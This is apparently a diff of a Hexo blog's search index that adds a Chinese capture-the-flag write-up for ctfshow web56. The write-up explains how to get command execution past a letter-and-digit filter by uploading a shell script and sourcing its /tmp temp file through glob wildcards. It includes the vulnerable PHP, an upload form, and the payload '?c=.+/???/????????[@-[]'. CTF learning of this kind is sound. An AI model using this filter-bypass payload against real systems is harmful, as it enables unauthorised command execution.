-<p>3.我们的poc的? 的数量只有11个，因为最后一个匹配为大写，用[@-[] 代替了，不需要在它的后面再加上?了</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>命令执行</category>
+        <category>前端</category>
+        <category>hexo</category>
       </categories>
   </entry>
   <entry>
@@ -2408,6 +2365,49 @@ index.php</p>
       <categories>
         <category>前端</category>
         <category>docker</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>无数字字母rce</title>
+    <url>/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce(ctfshow%20web%E5%85%A5%E9%97%A856)/</url>
+    <content><![CDATA[<p>面对ctfshow web入门56的学习</p>
+<a id="more"></a>
+<p><strong>我们根据这一题直接进入主题</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web56</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了字母，数字。</p>
+<p>看了三位师傅的 wp才醒悟 <a href="https://www.gem-love.com/websecurity/1407.html">y1ng</a> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神</a> <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">firebasky</a>  再次感谢三位师傅</p>
+<p><strong>先说一下这一题的解题思路：</strong></p>
+<p><strong>我们通过post一个文件(文件里面写入sh命令)，在上传的过程中，通过<code>.(点，也就是 source命令)</code>去执行执行这个文件。一般来说我们上传的文件在linux下临时保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</strong><br>
+**<code>注意：通过</code>.<code>去执行sh命令不需要有执行权限**</code></p>
+<p>好，接下来我已一个小白的角度分析题目所需的知识点。 首先是构造一个post文件上传，这里面也是很复杂的，参考 <a href="https://www.runoob.com/php/php-file-upload.html">PHP 文件上传 </a></p>
+<p><strong>下面就是我们构造的post文件上传数据包</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后直接抓包</p>
+<p><img src="https://img-blog.csdnimg.cn/20201101200259866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+接下来构造poc命令<br>
+<code>?c=.+/???/????????[@-[]</code><br>
+用到Linux下的glob通配符：</p>
+<ul>
+<li><code>*</code>可以代替0个及以上任意字符</li>
+<li><code>?</code>可以代表1个任意字符<br>
+注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br>
+<img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+</ul>
+<p>介绍一下<strong>bin目录:</strong></p>
+<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p>
+<p>在这里再解释一下为什么加上#！  #!的意思是调用  /bin/sh 命令所以需要加</p>
+<p>成功遍历当前目录文件<br>
+<img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>直接cat 得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20201101200444686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>补充</strong></p>
+<p>1.playload:?c=.+/???/???[@-[] 因为 .命令 (也就是source命令)执行需要用空格 我们用 + 绕过（也就是%20）。</p>
+<p>2.文件上传的时候 #!/bin/sh 加上 #！的意思是调用bin/sh的命令</p>
+<p>3.我们的poc的? 的数量只有11个，因为最后一个匹配为大写，用[@-[] 代替了，不需要在它的后面再加上?了</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>命令执行</category>
       </categories>
   </entry>
   <entry>
